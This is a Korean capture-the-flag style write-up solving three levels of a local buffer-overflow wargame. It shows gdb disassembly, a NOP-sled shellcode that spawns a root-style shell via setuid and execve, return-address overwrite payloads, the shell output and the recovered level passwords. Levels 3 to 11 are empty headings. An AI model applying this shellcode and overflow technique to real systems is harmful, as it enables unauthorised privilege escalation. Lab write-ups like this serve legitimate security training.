Wargame
=======
## 들어가기전에
lv0 비밀번호 : lv0   
알아야될 기초지식 : gdb 사용법

## lv 0
gdb로 lv1이 무슨 프로그램인지 확인해보자.   
```pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x100   
   0x08048439 <+9>:	cmp    DWORD PTR [ebp+0x8],0x1    
   0x0804843d <+13>:	jg     0x8048456 <main+38>   
   0x0804843f <+15>:	push   0x80484e0   
   0x08048444 <+20>:	call   0x8048350 <printf@plt>   
   0x08048449 <+25>:	add    esp,0x4   
   0x0804844c <+28>:	push   0x0   
   0x0804844e <+30>:	call   0x8048360 <exit@plt>   
   0x08048453 <+35>:	add    esp,0x4   
   0x08048456 <+38>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048459 <+41>:	add    eax,0x4   
   0x0804845c <+44>:	mov    edx,DWORD PTR [eax]   
   0x0804845e <+46>:	push   edx   
   0x0804845f <+47>:	lea    eax,[ebp-0x100]   
   0x08048465 <+53>:	push   eax   
   0x08048466 <+54>:	call   0x8048370 <strcpy@plt>   
   0x0804846b <+59>:	add    esp,0x8   
   0x0804846e <+62>:	lea    eax,[ebp-0x100]    
   0x08048474 <+68>:	push   eax   
   0x08048475 <+69>:	push   0x80484ec   
   0x0804847a <+74>:	call   0x8048350 <printf@plt>   
   0x0804847f <+79>:	add    esp,0x8   
   0x08048482 <+82>:	leave   
   0x08048483 <+83>:	ret   
```   
0x0804845f <+47>:	lea    eax,[ebp-0x100]   
이 부분을 보면 strcpy로 256바이트만큼의 문자열을 담을 수 있다.  

즉 ret부분까지 덮기위해서는 8바이트가 더 필요하다.  
따라서 260바이트 만큼 쓰레기 값을 담아주고 나머지 4바이트에 원하는 주소값을 넣어준다.   

```
`export SHELLCODE=`perl -e 'print "\x90"x200,"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
```   
또한 공격을 위한 쉘코드는 위처럼 export로 환경변수를 만들고 그 안에다가 nop값과 함께 넣어준다.   
그리고 gdb에서 ```x/2000x $esp```를 통해 알아낸 nop부분의 적당한 주소값을 ret에 넣어준다.   
이렇게 해주면 main이 끝나고 ret을 통해 nop주소로 이동을하며 쉘코드를 실행시키게 된다.

필자가 ret에 넣어줄 주소값은 ```0xffffda7c```이다.

실행결과   
```
./lv1 `perl -e 'print "a"x260, "\x7c\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|���
$ whoami
lv1
$ id
uid=1001(lv1) gid=1000(lv0) groups=1000(lv0),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)
```

성공적으로 권한을 얻은것을 확인할 수 있다.

알아낸 lv1 비번 : hello newbie!

## lv 1
gbd로 lv2가 무엇을 하는 프로그램인지 확인해보자. 
```
pwndbg> disass main   
Dump of assembler code for function main:   
   0x08048430 <+0>:	push   ebp   
   0x08048431 <+1>:	mov    ebp,esp   
   0x08048433 <+3>:	sub    esp,0x10   
   0x08048436 <+6>:	cmp    DWORD PTR [ebp+0x8],0x1   
   0x0804843a <+10>:	jg     0x8048453 <main+35>   
   0x0804843c <+12>:	push   0x80484d0   
   0x08048441 <+17>:	call   0x8048350 <printf@plt>    
   0x08048446 <+22>:	add    esp,0x4   
   0x08048449 <+25>:	push   0x0   
   0x0804844b <+27>:	call   0x8048360 <exit@plt>   
   0x08048450 <+32>:	add    esp,0x4   
   0x08048453 <+35>:	mov    eax,DWORD PTR [ebp+0xc]   
   0x08048456 <+38>:	add    eax,0x4   
   0x08048459 <+41>:	mov    edx,DWORD PTR [eax]   
   0x0804845b <+43>:	push   edx   
   0x0804845c <+44>:	lea    eax,[ebp-0x10]   
   0x0804845f <+47>:	push   eax   
   0x08048460 <+48>:	call   0x8048370 <strcpy@plt>   
   0x08048465 <+53>:	add    esp,0x8   
   0x08048468 <+56>:	lea    eax,[ebp-0x10]   
   0x0804846b <+59>:	push   eax   
   0x0804846c <+60>:	push   0x80484dc   
   0x08048471 <+65>:	call   0x8048350 <printf@plt>   
   0x08048476 <+70>:	add    esp,0x8   
   0x08048479 <+73>:	leave   
   0x0804847a <+74>:	ret  
   ```
lv1 프로그램과 크게 다른점은 없다.   

0x08048468 <+56>:	lea    eax,[ebp-0x10]   
다른점이라고하면 strcpy에 16바이트밖에 못 담는다는 것이고  
24바이트만에 ret까지 채워넣을 수 있게된다.

따라서 lv1과 같은 방법으로 문제를 풀어주면 된다.

실행결과
```
lv1@ubuntu:~$ ./lv2 `perl -e 'print "a"x20, "\xac\xda\xff\xff"'`
aaaaaaaaaaaaaaaaaaaa����
$ whoami
lv2
$ id
uid=1002(lv2) gid=1001(lv1) groups=1001(lv1)
```

알아낸 lv2 비번 : tooo easy
## lv 2
gdb로 lv3가 무슨 프로그램인지 확인해보자.
```
   0x080483f8 <+0>:	push   ebp
   0x080483f9 <+1>:	mov    ebp,esp
   0x080483fb <+3>:	sub    esp,0x10
   0x080483fe <+6>:	lea    eax,[ebp-0x10]
   0x08048401 <+9>:	push   eax
   0x08048402 <+10>:	call   0x804830c <gets@plt>
   0x08048407 <+15>:	add    esp,0x4
   0x0804840a <+18>:	lea    eax,[ebp-0x10]
   0x0804840d <+21>:	push   eax
   0x0804840e <+22>:	push   0x8048470
   0x08048413 <+27>:	call   0x804833c <printf@plt>
   0x08048418 <+32>:	add    esp,0x8
   0x0804841b <+35>:	leave  
   0x0804841c <+36>:	ret
   ```
lv3는 그 전과는 다르게 strcpy가 아닌 gets함수로 문자를 입력받게된다.   
마찬가지로 16바이트만큼 담을 수 있으며 초과부분은 ebp를 지나 ret까지 침범하게된다.  

그 전 문제들과는 같게 풀어주되 이번에는 ./lv3를 실행시킬때 파이프라인을 이용하자.  
```
lv2@ubuntu:~$ (perl -e 'print "a"x20, "\x8c\xda\xff\xff"';cat) | ./lv3
id
aaaaaaaaaaaaaaaaaaaa����id
id
uid=1003(lv3) gid=1002(lv2) groups=1002(lv2)
```

알아낸 lv2 비번 : i dont like stdin

## lv 3
## lv 4
## lv 5
## lv 6
## lv 7
## lv 8
## lv 9
## lv 10
## lv 11
